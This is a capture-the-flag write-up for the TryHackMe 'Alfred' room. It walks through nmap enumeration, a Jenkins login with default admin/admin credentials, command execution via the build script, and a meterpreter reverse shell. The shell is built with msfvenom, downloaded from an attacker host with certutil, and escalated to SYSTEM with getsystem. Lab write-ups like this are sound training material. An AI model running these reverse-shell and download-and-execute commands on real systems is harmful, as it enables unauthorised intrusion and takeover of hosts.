---
title: "THM - Alfred"
date: 2021-02-11T14:26:15+01:00
categories: ["hacking", "write-ups"]
tags: [THM]
featuredImage: "/images/2021/02/Alfred_Logo.png"
---
## Intro

Without further ado, let's get started and see what this box is made of!

## Target
[THM - Alfred](https://tryhackme.com/room/alfred)

## Recon

From the box logo and description we can discover that :

* Target runs Windows ;
* Target runs Jenkins.

Let's go!

## Enum

Let's start a basic `nmap` scan :

```text
sudo nmap -T4 -A -p- -oA nmap $target_ip
```

Unfortunately, nmap will complain that `Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn`.

No problem, let's fire our scan a bit differently :

```text
sudo nmap -T4 -A -p- -Pn -oA nmap $target_ip
```

This time, it will work :

```text
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 13:57 CET
Nmap scan report for $target_ip
Host is up (0.034s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2020-10-02T14:42:05
|_Not valid after:  2021-04-03T14:42:05
|_ssl-date: 2021-02-11T12:59:27+00:00; +12s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Vista|Phone (90%)
OS CPE: cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.99 ms 10.11.0.1
2   34.29 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.35 seconds
```

We discover the following :

* A web server running on port 80 : Microsoft IIS httpd 7.5 ;
* Another web server on port 8080 (probably Jenkins backend / admin area) : Jetty 9.4.z-SNAPSHOT ;
* RDP service running on port 3389.

![Jenkins Admin Login Page](/images/2021/02/jenkins_login.png)

Since we found a few web servers, I'll fire `nikto` and `dirbuster` on them in order to see if we find anything interesting.

Our various scans and manually browsing confirmed that we are up against a `Windows machine` running `Jenkins`.

While our extra scans our running, we can search if any known vulnerability applies to the services we found. For this, I recommend using `searchsploit` if you want to stay in the CLI, or search engines for a more graphical approach.

Unfortunately, we don't find anything relevant nor obvious. Let's see how we can attack this box.

## Exploitation

Since we haven't found anything huge, we'll try to login to the admin panel using default and / or well known credentials. This is a brute force attack!

It happens, that we are lucky, some lazy admin used `admin` // `admin` as credentials! It was my first try, I didn't even had to fire `Burp Intruder`, great!

![Jenkins Admin Panel](/images/2021/02/jenkins_admin.png)

From here, I am thinking there may be a way to upload a malicious file from the admin panel, in order to gain access to the system (spoiler: nope).

We also found one user and it's password : maybe this is a system user (which I doubt).

By browsing the Jenkins area (yes, recon again!), we notice the following :

* Jenkins version : Jenkins 2.190.1 core and libraries

then :

```text
Started by user admin
Running as SYSTEM
Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
[project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins8034204804437582227.bat

C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

It shows us that a build script is running and that it is just running the `whoami` command as user `bruce`. This is not huge, but it migh give us a shell as Bruce, and probably its flag too!

So, let's try to modify the build script in order to get Bruce's flag, that should be easy.

By simple browsing into the project and configuring the project, we'll try to get the flag like so :

![Jenkins Admin Panel](/images/2021/02/jenkins_config_build.png)

Now, we build it and check the logs :

![Jenkins User Flag](/images/2021/02/jenkins_user_flag.png)


And it worked! As I spoiled, I was wrong. No file upload from here, but an indirect shell!

### PrivEsc

Ok, now that we have confirmed that we can run commands as Bruce on the system, we have to think of a way to get a shell. This part shouldn't be hard : I am thinking like downloading a malicious shell then running it via the build system. However, that alone, won't help us much... it will make it easier to have a direct shell, but it won't suffice to get full control.

However, one easy solution would be to get a meterpreter shell and use msfconsole...

Before going any further, I will run another build doing a `dir "C:\"`. I just want to check the system architecture (be sure check my [cheatsheets](https://www.masoopy.com/cheatsheets/) if you are lost during a phase). It might prove useful later on, if I want to craft something with `msfvenom`.

Since we know our arch is 64 bits, let's craft our shell :

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=10443 -f exe > shell.exe`

Now we run a basic HTTP server from our attacking machine to host the shell :

`sudo python2 -m SimpleHTTPServer 80`

On our target machine, we edit the build script so that :

1. it downloads our malicious file : `certutil -urlcache -f http://$attacker_ip/shell.exe C:\Users\Bruce\Desktop\shell.exe`
2. it runs it : `C:\Users\Bruce\Desktop\shell.exe`

Saving the changes, and back on our attacking machine, we run `msfconsole` and `use exploit/multi/handler`, set the correct options. In our case, we listen on port 10443.

Back again on the Jenkins' machine, hit the build button, a meterprter shell as Bruce should now open :

![Jenkins meterpreter](/images/2021/02/jenkins_meterpreter.png)

Thanks to power of metasploit, a simple `getsystem` will give us root:

![Jenkins root](/images/2021/02/jenkins_user_root.png)

NB : this is where MetaSploit is clearly TOO powerful! I gained `SYSTEM`, using only one command... I have no idea what went on behind the scenes! I clearly need to look for a manual way to do that. But this will be for another time.


Since we are "root", let's search for the flag :

```text
search -f root.txt
```
```text
Found 1 result...
    c:\Windows\System32\config\root.txt (70 bytes)
```

then : 

```text
cat "c:\Windows\System32\config\root.txt"
```

![Jenkins Root Flag](/images/2021/02/jenkins_root_flag.png)


## Outro

This was a fun box, pretty straight forward, where a simple misconfiguration, led to a fully remote access... again!